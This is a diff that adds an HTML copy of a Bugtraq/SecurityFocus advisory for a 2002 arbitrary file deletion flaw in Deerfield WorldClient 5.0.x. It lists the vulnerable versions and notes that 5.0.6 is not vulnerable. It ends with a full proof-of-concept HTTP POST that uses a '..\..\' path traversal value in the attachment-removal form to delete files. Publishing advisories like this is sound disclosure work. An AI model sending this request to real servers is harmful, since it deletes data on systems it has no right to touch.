@@ -1,0 +1,211 @@
+#SpeeDr00t@Black Falcon<br>#bid4687<p><b><span style="font-size: 18pt;">WorldClient Arbitrary File Deletion Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/4687/info">info</a><br><a href="http://www.securityfocus.com/bid/4687/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/4687/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/4687/solution">solution</a><br><a href="http://www.securityfocus.com/bid/4687/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				4687
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				May 07 2002 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				May 07 2002 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery of this issue is credited to Obscure &lt;obscure@eyeonsecurity.net&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Deerfield Worldclient Pro 5.0 <br/>
+<span class="related">
+						
+							+ 
+						
+						Deerfield MDaemon Pro 5.0 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  SP2<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  SP1<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 2000 Professional  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 95  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows 98  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows ME  <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP6a<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP6<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP5<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP4<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP3<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP2<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0 SP1<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows NT Workstation  4.0<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Microsoft Windows XP Home  <br/>
+</span>
+					
+				
+					Deerfield Worldclient 5.0.5 <br/>
+					
+				
+					Deerfield Worldclient 5.0.4 <br/>
+					
+				
+					Deerfield Worldclient 5.0.3 <br/>
+					
+				
+					Deerfield Worldclient 5.0.2 <br/>
+					
+				
+					Deerfield Worldclient 5.0.1 <br/>
+					
+				
+					Deerfield Worldclient 5.0 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					Deerfield Worldclient 5.0.6 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following HTTP request demonstrates exploitation of this vulnerability to delete '..\..\test.txt':<br/><br/>POST /WorldClient.cgi?Session=xxxx&amp;View=Compose-Attach HTTP/1.1<br/>Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*<br/>Referer: http://victom.com:3001/WorldClient.cgi?Session=xxxx&amp;View=Options-Folders<br/>Content-Type: multipart/form-data; boundary=---------------------------7d2851b9074c<br/>Accept-Encoding: gzip, deflate<br/>User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; Q312461)<br/>Host: victim:3001<br/>Content-Length: 407<br/>Connection: Keep-Alive<br/>Cache-Control: no-cache<br/>Cookie: User=MDaemon; Lang=en; Theme=Standard; Session=xxxx<br/><br/>-----------------------------7d2851b9074c<br/>Content-Disposition: form-data; name="Attachment"; filename=""<br/>Content-Type: application/octet-stream<br/><br/>-----------------------------7d2851b9074c<br/>Content-Disposition: form-data; name="Attachments"<br/><br/>..\..\test.txt<br/>-----------------------------7d2851b9074c<br/>Content-Disposition: form-data; name="Remove"<br/><br/>Remove<br/>-----------------------------7d2851b9074c--
+	
+		<ul>
+</ul>
+</div>
